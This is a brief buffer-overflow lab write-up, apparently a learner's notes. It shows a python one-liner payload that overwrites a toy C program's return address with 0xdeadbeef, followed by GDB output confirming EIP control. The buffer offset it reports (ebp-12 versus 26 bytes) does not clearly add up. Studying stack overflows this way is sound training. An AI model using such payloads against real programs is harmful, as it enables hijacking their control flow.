# ✅ Buffer Overflow Milestone — Hijacking EIP

## Experiment Summary
- **Goal:** Overwrite the return address on the stack using a buffer overflow.
- **Program Setup:**
  - A simple 32-bit C program using `scanf()` to read user input into a local buffer (`char buffer[10];`).
  - Breakpoint set at `get_username()` inside GDB.

## Key Observations
- Buffer located at: `ebp - 12`
- Return address reached after: **26 bytes**
- Return address: **4 bytes long** (overwritten at offset 26)

## Payload Used
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*26 + b"\xef\xbe\xad\xde")' > input.txt
```
- `"A"*26`: Fills buffer and saved EBP
- `\xef\xbe\xad\xde`: Little-endian format of `0xdeadbeef`

## Result
- Program crashed as expected
- GDB output:
  ```
  Program received signal SIGSEGV, Segmentation fault.
  0xdeadbeef in ?? ()
  ```
- `info registers` showed:
  ```
  eip            0xdeadbeef
  ```

## Conclusion
Successfully demonstrated a buffer overflow:
- Identified the exact offset to control EIP
- Proved exploitability by injecting a known address (`0xdeadbeef`)
- Ready to move on to shellcode or deeper stack control
